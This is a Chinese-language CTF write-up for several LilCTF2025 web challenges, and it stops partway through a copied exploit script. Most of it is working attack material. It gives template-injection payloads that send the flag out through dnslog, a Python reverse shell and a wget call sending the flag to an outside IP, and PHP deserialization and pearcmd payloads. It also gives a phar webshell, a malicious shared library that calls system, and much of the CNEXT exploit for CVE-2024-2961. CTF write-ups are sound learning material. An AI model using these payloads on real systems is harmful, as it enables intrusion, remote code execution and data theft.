---
title: LilCTF2025
date: 2026-02-25 16:16:12
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/image-20260304223854638.png
categories: CTF
---

## ez_bottle

大致思路就是/upload路由上传一个zip文件，然后bottle模版会渲染里面的文件

那么好，第一个问题就是他没有上传文件的地方，需要自己发起post请求，zip文件该怎么传呢？

当然可以写一个脚本，这个最直接，不过这个题比较简单，写脚本浪费时间，更方便的是用Talend API Tester

那么payload如何构造？bottle的waf还是比较好绕的

```python
BLACK_DICT = ["{", "}", "os", "eval", "exec", "sock", "<", ">", "bul", "class", "?", ":", "bash", "_", "globals",
              "get", "open"]
```

[bottlepy template - Simple Love - 博客园](https://www.cnblogs.com/i2u9/p/bottle-template.html)  这个可以绕过花括号，关键字的话全角、斜体、异形相近字符都可以

但是这个题没有回显，可以利用报错输出，也可以dnslog外带

```
% import ºs
% flag=ºs.pºpen('cat /flag').read()
% raise Exception(flag)
```

```
%import pty
%pty.spawn(['/bin/sh', '-c', 'ping -c 1 `cat /flag|base64|tr -d "\n"`.abcdef.dnslog.cn'])
```

![image-20260225163225160](https://gitee.com/bobrocket/img/raw/master/img/image-20260225163225160.png)

![image-20260225163239946](https://gitee.com/bobrocket/img/raw/master/img/image-20260225163239946.png)

## 我曾经有一份工作

需要一些脑洞，不看wp真想不出来，一开始还以为是SQL注入，到处找注入点

dirsearch扫一下目录，发现www.zip

config目录下发现UC_KEY

![image-20260226144350645](https://gitee.com/bobrocket/img/raw/master/img/image-20260226144350645.png)

代码审计一下api目录，有一个dbbak.php可以备份sql数据库，丢给ai能直接出加密脚本

```php
<?php

define('UC_KEY', 'N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb');

function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length = 4;

    $key = md5($key ? $key : UC_KEY);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);

    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);

    $result = '';
    $box = range(0, 255);

    $rndkey = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if($operation == 'DECODE') {
        if(((int)substr($result, 0, 10) == 0 || (int)substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) === substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }

}

function encode_arr($get) {
    $tmp = '';
    foreach($get as $key => $val) {
        $tmp .= '&'.$key.'='.$val;
    }
    return _authcode($tmp, 'ENCODE', UC_KEY);
}

$get = array('time'=>time(),'method'=>'export');
$res = encode_arr($get);
echo $res;
```

然后get请求备份数据库

![image-20260226150048861](https://gitee.com/bobrocket/img/raw/master/img/image-20260226150048861.png)

下载数据库找pre_a_flag表

![image-20260226150120226](https://gitee.com/bobrocket/img/raw/master/img/image-20260226150120226.png)

hex解码

![image-20260226150144383](https://gitee.com/bobrocket/img/raw/master/img/image-20260226150144383.png)

[失败的Discuz渗透总结](https://mp.weixin.qq.com/s/IDkUpjPL0mzSxKOgldHPeQ)

## Ekko_note

通过这个题学习了一下UUID和random伪随机

我们先看一下RCE部分

![image-20260226201422215](https://gitee.com/bobrocket/img/raw/master/img/image-20260226201422215.png)

需要验证时间>2066，但时间是通过api接口获取的当下时间

![image-20260226201559274](https://gitee.com/bobrocket/img/raw/master/img/image-20260226201559274.png)

首页提醒我们admin账户可以随时调整api地址，那么下一步就是拿到admin账户。它有一个忘记密码的功能，会发送token到注册邮箱(bushi)，那么这个token能否伪造？

```python
token = str(uuid.uuid8(a=padding(user.username)))
```

我们看一下uuid8的代码逻辑

![image-20260226201928274](https://gitee.com/bobrocket/img/raw/master/img/image-20260226201928274.png)

调用了random，而开头就设置了随机种子，那么加密的结果就是可预测的了

```python
# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。
# 反正整个程序没有一个地方用到random库。应该没有什么问题。
import random
random.seed(SERVER_START_TIME)
```

随机种子是运行时长，怎么获得呢？

![image-20260226202436674](https://gitee.com/bobrocket/img/raw/master/img/image-20260226202436674.png)

/server_info路由就有。下面就可以伪造token了

```python
import random
import uuid
random.seed(1772107995.1674747)

def padding(input_string):
    byte_string = input_string.encode('utf-8')
    if len(byte_string) > 6: byte_string = byte_string[:6]
    padded_byte_string = byte_string.ljust(6, b'\x00')
    padded_int = int.from_bytes(padded_byte_string, byteorder='big')
    return padded_int

token = str(uuid.uuid8(a=padding("admin")))
print(token)
```

![image-20260226203034132](https://gitee.com/bobrocket/img/raw/master/img/image-20260226203034132.png)

成功了，下面要更改api，自己搭一个

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class JSONRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            data = {"date": "2099-07-05 00:00:00"}
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode("utf-8"))

def run(server_class=HTTPServer, handler_class=JSONRequestHandler, port=7777):
    server_address = ("0.0.0.0", port)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

if __name__ == "__main__":
    run()
```

![image-20260226204742825](https://gitee.com/bobrocket/img/raw/master/img/image-20260226204742825.png)

下面的命令执行没有回显，可以反弹shell或者外带数据

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("183.66.27.22",18546));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

![image-20260226204835508](https://gitee.com/bobrocket/img/raw/master/img/image-20260226204835508.png)

```
wget http://183.66.27.22:18546/$(cat /flag)
```

![image-20260226205029809](https://gitee.com/bobrocket/img/raw/master/img/image-20260226205029809.png)

## Your Uns3r

！新春杯ez_uns原来是从这里来的

不过看了出题人的wp，升级后的题目有几个WAF绕过的手法还真没见过

```php
<?php
highlight_file(__FILE__);
class User
{
    public $username;
    public $value;
    public function exec()
    {
        if (strpos($this->value, 'S:') === false) {
            $ser = serialize(unserialize($this->value));
            $instance = unserialize($ser);
            if ($ser != $this->value && $instance instanceof Access) {
                include($instance->getToken());
            }
        } else {
            throw new Exception("wanna ?");
        }
    }
    public function __destruct()
    {
        if ($this->username === "admin") {
            $this->exec();
        }
    }
}

class Access
{
    protected $prefix;
    protected $suffix;

    public function getToken()
    {
        if (!is_string($this->prefix) || !is_string($this->suffix)) {
            throw new Exception("Go to HELL!");
        }
        $result = $this->prefix . 'lilctf' . $this->suffix . '.php';
        if (strpos($result, 'pearcmd') !== false) {
            throw new Exception("Can I have peachcmd?");
        }
        return $result;

    }
}

$ser = $_POST["user"];
if (stripos($ser, 'admin') !== false || stripos($ser, 'Access":') !== false) {
    exit ("no way!!!!");
}

$user = unserialize($ser);
throw new Exception("nonono!!!");
```

首先是admin变成了强比较不能用true或者0来绕过检查了，那就只能用大写+十六进制

同时类名不能是Access（也不能用小写绕过检查），结合下面的反序列化再序列化，可以用`__PHP_Incomplete_Class_Name`

[PHP: __PHP_Incomplete_Class - Manual](https://www.php.net/manual/zh/class.php-incomplete-class.php)

反序列化一个不存在的类来让作为 `__PHP_Incomplete_Class_Name` 的成员变为类名, 这样也会让两次反序列化结果不一致

```php
$result = $this->prefix . 'lilctf' . $this->suffix . '.php';
```

include这里也做了限制，只能是php文件，这里了解一下pearcmd.php

[关于pearcmd.php的利用 - Yuy0ung - 博客园](https://www.cnblogs.com/yuy0ung/articles/18220835)

这里pearcmd被禁了，我们找它的平替peclcmd.php

exp:

```php
<?php

class Access
{
    protected $prefix = '/usr/local/lib/';
    protected $suffix = '/../php/peclcmd.php';
}

class User
{
    public $username;
    public $value;
}


$user = new User();
$token = new Access();
$user->username = 'admin';
$ser = serialize($token);
$ser = str_replace('Access":2', 'LilRan":3', $ser);

$ser = substr($ser, 0, -1);
$ser .= 's:27:"__PHP_Incomplete_Class_Name";s:6:"Access";}';
$user->value = $ser;
$userser = serialize($user);
$userser = str_replace(';s:5:"admin"', ';S:5:"\61dmin"', $userser);
$fin = substr($userser, 0, -1);
echo urlencode($fin) . "\n";
```

构造请求

```
POST /index.php?+config-create+/<?=eval($_POST[0])?>+/var/www/html/index.php HTTP/1.1
Host: challenge.imxbt.cn:31707
Content-Type: application/x-www-form-urlencoded

user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22%5C61dmin%22%3Bs%3A5%3A%22value%22%3Bs%3A147%3A%22O%3A6%3A%22LilRan%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A15%3A%22%2Fusr%2Flocal%2Flib%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A19%3A%22%2F..%2Fphp%2Fpeclcmd.php%22%3Bs%3A27%3A%22__PHP_Incomplete_Class_Name%22%3Bs%3A6%3A%22Access%22%3B%7D%22%3B&0=system('/readflag');
```

这里注意用bp发送请求，hack的话会自动url编码php标识

##  接力！TurboFlash

访问/sercret就可以获得flag，但是Nginx 会屏蔽 `/secret` 和 `/secret/` 后接任意路径的请求

这里找到了 [nginx deny限制路径绕过-先知社区](https://xz.aliyun.com/news/14403)

![image-20260228145801578](https://gitee.com/bobrocket/img/raw/master/img/image-20260228145801578.png)

## php_jail_is_my_cry

这下真是cry了，调了一下午+一晚上

```php
<?php
if (isset($_POST['url'])) {
    $url = $_POST['url'];
    $file_name = basename($url);
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    
    if ($data) {
        file_put_contents('/tmp/'.$file_name, $data);
        echo "文件已下载: <a href='?down=$file_name'>$file_name</a>";
    } else {
        echo "下载失败。";
    }
}

if (isset($_GET['down'])){
    include '/tmp/' . basename($_GET['down']);
    exit;
}

// 上传文件
if (isset($_FILES['file'])) {
    $target_dir = "/tmp/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);
    $orig = $_FILES["file"]["tmp_name"];
    $ch = curl_init('file://'. $orig);
    
    // I hide a trick to bypass open_basedir, I'm sure you can find it.

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    if (stripos($data, '<?') === false && stripos($data, 'php') === false && stripos($data, 'halt') === false) {
        file_put_contents($target_file, $data);
    } else {
        echo "存在 `<?` 或者 `php` 或者 `halt` 恶意字符!";
        $data = null;
    }
}
```

上传文件又有include所以可以打phar [php 文件上传不含一句 php 代码 RCE 最新新姿势-先知社区](https://xz.aliyun.com/news/18584)

看一眼php.ini

```。。。
open_basedir = /var/www/html:/tmp
disable_functions=太多了。。。
```

这里找到一个脚本可以看看还有什么函数可用

```php
<?php
// 用户提供的禁用函数列表（此处为简化示例，实际需替换为完整列表）
$disabledFunctions = [
   'zend_version',
 'func_num_args',
 'func_get_arg',
 'func_get_args',
 'strlen',
 'strcmp',
 'strncmp',
 'strcasecmp',
 'strncasecmp',
 'each',
 'error_reporting',
 'define',
];
//由于篇幅问题这里不给全禁用函数，自行php.ini获取即可

// 获取所有内置函数并分类
$allFunctions = get_defined_functions();
$internalFunctions = $allFunctions['internal'];
$userFunctions = $allFunctions['user']; // 通常为空

// 筛选未禁用的函数
$availableFunctions = array_diff($internalFunctions, $disabledFunctions);

// 验证函数实际可用性
$verifiedFunctions = [];
foreach ($availableFunctions as $func) {
    if (function_exists($func)) {
        // 分类：普通函数 vs 面向对象函数（根据命名特征）
        $type = (strpos($func, '_') !== false && preg_match('/^[a-z]+_[a-z]/', $func)) 
                ? '普通函数' : '面向对象函数';
        $verifiedFunctions[$type][] = $func;
    }
}

// 输出结果
header('Content-Type: text/html; charset=utf-8');
echo "<!DOCTYPE html><html><head><title>PHP可用函数检测报告</title>";
echo "<style>
    body { font-family: sans-serif; margin: 20px; }
    table { border-collapse: collapse; width: 100%; margin-bottom: 30px; }
    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
    th { background-color: #f2f2f2; }
    h2 { color: #2c3e50; }
    .count { background-color: #e74c3c; color: white; padding: 2px 8px; border-radius: 10px; }
</style></head><body>";

foreach ($verifiedFunctions as $type => $functions) {
    echo "<h2>{$type} (<span class='count'>" . count($functions) . "</span>)</h2>";
    echo "<table><tr><th>函数名</th><th>类型</th></tr>";
    $chunked = array_chunk($functions, 5); // 每行5个函数
    
    foreach ($chunked as $row) {
        echo "<tr>";
        foreach ($row as $func) {
            echo "<td><code>$func</code></td><td>{$type}</td>";
        }
        // 补全表格单元格
        $missingCells = 5 - count($row);
        for ($i = 0; $i < $missingCells; $i++) {
            echo "<td></td><td></td>";
        }
        echo "</tr>";
    }
    echo "</table>";
}

echo "</body></html>";
?>
```

file_put_contents和include或许有利用价值

先用file_put_contents下马

```php
<?php
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->setStub(
    '
<?php 
 eval($_POST[0]);
 __HALT_COMPILER();
 ?>
'
);
$phar->addFromString('suny', '111');
$phar->stopBuffering();
```

由于上传过滤了halt，用gzip压缩一下

```
gzip -c payload.phar > shell.phar
```

成功读到了index.php缺失的部分

```
// I hide a trick to bypass open_basedir, I'm sure you can find it.
curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
```

看一眼php版本是8.3，所以要用curl绕过open_basedir

下一步就是执行/readflag，有两个思路

### curl加载so

[最新版 PHP 绕 open_basedir 和 disable_functions – fushulingのblog](https://fushuling.com/index.php/2025/11/01/最新版-php-绕-open_basedir-和-disable_functions/)

```cpp
#include <stdlib.h>

__attribute__((constructor))
static void rce_init(void){
    system("/readflag > /tmp/1.txt");
    
}
```

在linux下打包so

```
g++ -fPIC -shared -o evil.so 1.cpp
```

```
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSLENGINE,"/tmp/evil.so");
$data = curl_exec($ch);
```

![image-20260301133121019](https://gitee.com/bobrocket/img/raw/master/img/image-20260301133121019.png)

### CVE-2024-2961

file_get_contents被ban了，include也没有开启allow_url_include

但是我们现在是有 file_put_contents 在限制的目录下写内容, 我们可以将这需要通过 filter chain 的内容写到一个文件中, 然后再讲原始 filter chain 的来源指向这个文件, 同样也能触发

读取/proc/self/maps并找到libc地址

![image-20260301134959577](https://gitee.com/bobrocket/img/raw/master/img/image-20260301134959577.png)

libc.so.6是二进制文件可以用bp保存到文件注意删掉响应头，不要留空行

这里用kezibei师傅的脚本跑了十几遍（map和libc没有问题）都报错，真没招了

cn-ext那个我不太会改，这里从网上抄了一个脚本，可以跑出来

exp:

```php
<?php

$phar = new Phar('exp.phar');
$phar->setStub('<?php 
if (isset($_POST["download"])) {
    $ch = curl_init("file://". $_POST["download"]);
    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    echo $data;
}
    
if (isset($_POST["include"])) {
    include $_POST["include"];
}

if (isset($_POST["content"]) && isset($_POST["path"])) {
    $content = $_POST["content"];
    if ($_POST["base64"]) {
    	$content = base64_decode($content);
    }
    file_put_contents($_POST["path"], $_POST["content"]);
}
__HALT_COMPILER(); ?>');
$phar->addFromString('nothing','OK');


$gz = gzopen("exp.phar.gz", 'wb');
gzwrite($gz, file_get_contents('exp.phar'));
gzclose($gz);
```

cn-ext:

~~~python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *

import random
import string


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        # return self.session.post(self.url, data={"file": path})
        return self.session.post(self.url, data={"include": path})
    
    # --------
    def upload(self, path: str, content: str) -> Response:
        return self.session.post(self.url, data={"path": path, "content": content})
    
    def iconv(self, filters: str | None, content: str | bytes) -> Response:
        filename = "".join(random.choices(string.ascii_letters, k=6))
        path = f"/tmp/{filename}"
        self.upload(path, content)
        return self.send(f"php://filter{filters}/resource={path}")
    # --------

        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        # path = f"php://filter/convert.base64-encode/resource={path}"
        # response = self.send(path)
        # data = response.re.search(b"File contents: (.*)", flags=re.S).group(1)
        # return base64.decode(data)
        return self.session.post(self.url, data={"download": path}).content

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        # --------
        def safe_iconv(filters: str, content: str) -> Response:
            try:
                return self.remote.iconv(filters, content)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
        # --------
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, filters: str, content: str) -> bool:
        # def check_token(text: str, path: str) -> bool:
            # result = safe_download(path)
            result = safe_iconv(filters, content).content
            return text.encode() == result

        text = tf.random.string(50).encode()
        # base64 = b64(text, misalign=True).decode()
        # path = f"data:text/plain;base64,{base64}"
        
        # result = safe_download(path)
        result = safe_iconv("", text).content
        
        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        # base64 = b64(text.encode(), misalign=True).decode()
        # path = f"php://filter//resource=data:text/plain;base64,{base64}"
        # if not check_token(text, path):
        if not check_token(text, "/", text):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = tf.random.string(50)
        # base64 = b64(compress(text.encode()), misalign=True).decode()
        # path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        # if not check_token(text, path):
        if not check_token(text, "/zlib.inflate", compress(text.encode())):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "/dev/shm/cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        # resource = b64(resource)
        # resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
